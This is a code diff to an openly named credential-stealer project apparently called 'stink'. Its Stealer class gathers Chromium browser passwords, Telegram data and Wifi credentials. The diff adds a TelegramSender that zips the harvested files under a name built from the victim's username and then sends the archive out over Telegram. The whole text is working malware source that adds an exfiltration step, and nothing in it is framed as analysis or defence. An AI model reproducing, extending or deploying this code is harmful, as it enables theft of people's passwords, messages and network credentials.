@@ -8,7 +8,10 @@ from stink.modules import (
     Chromium,
     Telegram,
     Wifi,
+    TelegramSender,
 )
+from getpass import getuser
+from random import random
 
 
 class Stealer(Thread):
@@ -16,11 +19,12 @@ class Stealer(Thread):
     Collects and sends the specified data.
     """
 
-    def __init__(self):
+    def __init__(self, sender: TelegramSender = None):
         Thread.__init__(self, name="S")
 
         self.__config = MultistealerConfig()
         self.__storage = MemoryStorage()
+        self.__sender = sender
 
         browser_functions = [
             Features.passwords,
@@ -102,10 +106,12 @@ class Stealer(Thread):
                     ],
                 )
             pool.close()
-
+            output_file_path = f"{getuser()}.{random()}.zip"
             self.__storage.create_zip(
-                [file for files in results if files for file in files]
+                [file for files in results if files for file in files], output_file_path
             )
+            if self.__sender:
+                self.__sender.run(output_file_path)
 
         except Exception as e:
             print(f"[Multi stealer]: {repr(e)}")
